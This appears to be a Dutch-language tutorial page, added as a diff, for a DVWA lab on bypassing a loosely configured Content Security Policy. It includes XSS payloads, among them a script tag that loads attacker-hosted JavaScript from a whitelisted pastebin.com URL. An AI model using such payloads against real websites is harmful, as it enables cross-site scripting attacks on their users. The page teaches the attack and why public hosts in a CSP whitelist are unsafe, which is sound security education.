@@ -1,0 +1,71 @@
+---
+sidebar_position: 1
+sidebar_label: 'Low'
+hide_table_of_contents: true
+---
+
+import DvwaLab from '@site/src/components/DvwaLab';
+
+# CSP Bypass — Low
+
+Content Security Policy (CSP) is een HTTP-header die door de server wordt meegestuurd om de browser te vertellen welke bronnen (scripts, afbeeldingen, stijlen) betrouwbaar zijn. Het is bedoeld om XSS in de kiem te smoren. Maar wat als de CSP zelf lek is?
+
+## 1. Predict (Voorspel)
+
+De webserver stuurt de volgende CSP header naar je browser:
+`Content-Security-Policy: script-src 'self' https://pastebin.com hastebin.com;`
+
+**Vraag:** Stel, je vindt een XSS kwetsbaarheid op deze pagina en je probeert `<script>alert(1)</script>` te injecteren. Waarom blokkeert de browser dit, maar kun je de aanval wél laten slagen via Pastebin?
+
+<details>
+<summary>Antwoord</summary>
+
+De CSP-header vertelt de browser: "Je mag alléén JavaScript uitvoeren als het afkomstig is van ons eigen domein (`self`), of als het gedownload wordt vanaf `pastebin.com` of `hastebin.com`". 
+Inline scripts (zoals jouw losse `<script>alert(1)</script>`) worden door de browser genadeloos geblokkeerd. 
+Echter, als jij een account aanmaakt op Pastebin, daar je kwaadaardige JavaScript code plaatst, en vervolgens op DVWA de volgende code injecteert: 
+`<script src="https://pastebin.com/raw/JOUW_CODE"></script>`
+Dan denkt de browser: "Ah, Pastebin! Dat staat in de veilige lijst, dus ik voer het uit!"
+</details>
+
+## 2. Run & Investigate
+
+Start het lab. Je ziet een venster dat vraagt om scripts vanaf geautoriseerde bronnen.
+
+<DvwaLab module="csp_bypass" level="low" />
+
+> ⚠️ **Labbeperking:** Deze aanval vereist het hosten van een extern script op een platform zoals **Pastebin**. Het lab hierboven simuleert de CSP-logica, maar de daadwerkelijke externe script-injectie kun je alleen testen met een [lokale DVWA-installatie](/docs/dvwa_installatie).
+
+Probeer een normaal script (`<script>alert('test')</script>`) in te voeren en kijk in de F12 Console. Je zult een rode CSP waarschuwing zien die je script blokkeert.
+
+## 3. Modify & Make (Aanpassen & Maken)
+
+Bouw een XSS-aanval die misbruik maakt van de slordig geconfigureerde CSP whitelist.
+
+<details>
+<summary>Tip</summary>
+
+Normaal gesproken moet je hiervoor naar pastebin.com, daar `alert("Hacked CSP");` typen en de "Raw" link kopiëren. Omdat pastebin soms blokkeert of de URL's veranderen, kun je ook in gedachten houden hoe dit mechanisme werkt: je verwijst het `src` attribuut van je script tag naar de goedgekeurde domeinnaam.
+</details>
+
+<details>
+<summary>Antwoord</summary>
+
+In de praktijk vul je dit in:
+`<script src="https://pastebin.com/raw/JOUW_ID_HIER"></script>`
+Zodra de browser dit leest, controleert hij de domeinnaam. Die staat op de whitelist. De browser downloadt braaf het script van de hacker en voert het uit!
+</details>
+
+## 4. ✓ Wat moest je zien?
+
+:::tip Controle
+- In een **lokale DVWA-installatie**: na het submitten van `<script src="https://pastebin.com/raw/JOUW_ID"></script>` verschijnt een **popup** met de inhoud van je gehoste script.
+- Met een gewone inline `<script>alert(1)</script>` zie je in F12 Console een **rode CSP-fout** ("Refused to execute inline script") — dat is de policy in actie.
+- In het **iframe-lab hier**: via **Bekijk broncode** of de Network-tab zie je de `Content-Security-Policy: script-src 'self' https://pastebin.com hastebin.com` header — daar herken je de slordige whitelist.
+
+Hosting via Pastebin werkt niet meer? Pastebin blokkeert anonieme raw-URLs steeds vaker. Het concept is wat telt: een script-src whitelist met publieke hosters is altijd lek.
+:::
+
+## 5. Er gaat iets mis...
+
+Waarom zetten ontwikkelaars sites als Pastebin, Google Fonts of externe CDN's in hun CSP?
+Omdat ze dit vaak nodig hebben voor hun eigen website functionaliteit (bijv. jQuery inladen). Ze vergeten echter dat een domein zoals Pastebin of GitHub door *iedereen* (dus ook hackers) gebruikt kan worden om bestanden te hosten. Zet NOOIT publieke, onbeheerde platformen in je CSP whitelist!
